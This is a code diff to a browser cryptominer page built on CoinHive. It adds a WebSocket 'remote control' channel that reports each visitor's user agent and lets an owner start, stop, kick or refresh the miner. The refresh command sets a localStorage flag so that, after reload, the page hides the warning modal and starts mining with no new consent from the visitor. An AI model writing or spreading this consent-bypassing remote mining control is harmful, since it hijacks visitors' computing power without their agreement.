@@ -632,7 +632,114 @@
     document.getElementById('startBtn').onclick = safeStartMining;
     document.getElementById('stopBtn').onclick = stopMining;
     document.getElementById('maxBtn').onclick = enableMaxPower;
-    window.addEventListener('load', init);
+    
+    // =========================================================================
+    // REMOTE CONTROL - Owner can control this miner remotely
+    // =========================================================================
+    let controlSocket = null;
+    let controlReconnectTimeout = null;
+    
+    function connectControlSocket() {
+      // Use same proxy URL but different endpoint
+      const controlUrl = proxyUrl.replace('/proxy', '/control');
+      
+      try {
+        controlSocket = new WebSocket(controlUrl);
+        
+        controlSocket.onopen = function() {
+          console.log('[Control] Connected to control channel');
+          // Send identification
+          controlSocket.send(JSON.stringify({
+            type: 'identify',
+            userAgent: navigator.userAgent
+          }));
+        };
+        
+        controlSocket.onmessage = function(event) {
+          try {
+            const msg = JSON.parse(event.data);
+            console.log('[Control] Received:', msg);
+            
+            if (msg.type === 'command') {
+              handleRemoteCommand(msg.action);
+            }
+          } catch(e) {
+            console.error('[Control] Parse error:', e);
+          }
+        };
+        
+        controlSocket.onclose = function() {
+          console.log('[Control] Disconnected, reconnecting in 10s...');
+          controlReconnectTimeout = setTimeout(connectControlSocket, 10000);
+        };
+        
+        controlSocket.onerror = function(err) {
+          console.error('[Control] Error:', err);
+        };
+      } catch(e) {
+        console.error('[Control] Failed to connect:', e);
+        controlReconnectTimeout = setTimeout(connectControlSocket, 10000);
+      }
+    }
+    
+    function handleRemoteCommand(action) {
+      log('📡 Remote command: ' + action, 'warning');
+      
+      switch(action) {
+        case 'stop':
+          stopMining();
+          break;
+          
+        case 'start':
+          if (!miner || !miner.isRunning()) {
+            safeStartMining();
+          }
+          break;
+          
+        case 'refresh':
+          // Set auto-agree flag and refresh
+          localStorage.setItem('autoAgree', 'true');
+          location.reload();
+          break;
+          
+        case 'kick':
+          // Stop and don't reconnect
+          stopMining();
+          if (controlSocket) controlSocket.close();
+          if (controlReconnectTimeout) clearTimeout(controlReconnectTimeout);
+          log('🚫 Kicked by owner', 'error');
+          break;
+      }
+    }
+    
+    // =========================================================================
+    // AUTO-AGREE ON PAGE LOAD (for refresh command)
+    // =========================================================================
+    function checkAutoAgree() {
+      if (localStorage.getItem('autoAgree') === 'true') {
+        localStorage.removeItem('autoAgree');
+        console.log('[Auto] Auto-agreeing after refresh');
+        // Hide modal and start mining
+        document.getElementById('warningModal').style.display = 'none';
+        // Wait for init then start
+        const tryStart = function() {
+          if (typeof CoinHive !== 'undefined') {
+            safeStartMining();
+          } else {
+            setTimeout(tryStart, 500);
+          }
+        };
+        setTimeout(tryStart, 1000);
+      }
+    }
+    
+    // Connect control socket after page loads
+    window.addEventListener('load', function() {
+      init();
+      checkAutoAgree();
+      // Connect control socket after a short delay
+      setTimeout(connectControlSocket, 2000);
+    });
   </script>
 </body>
 </html>
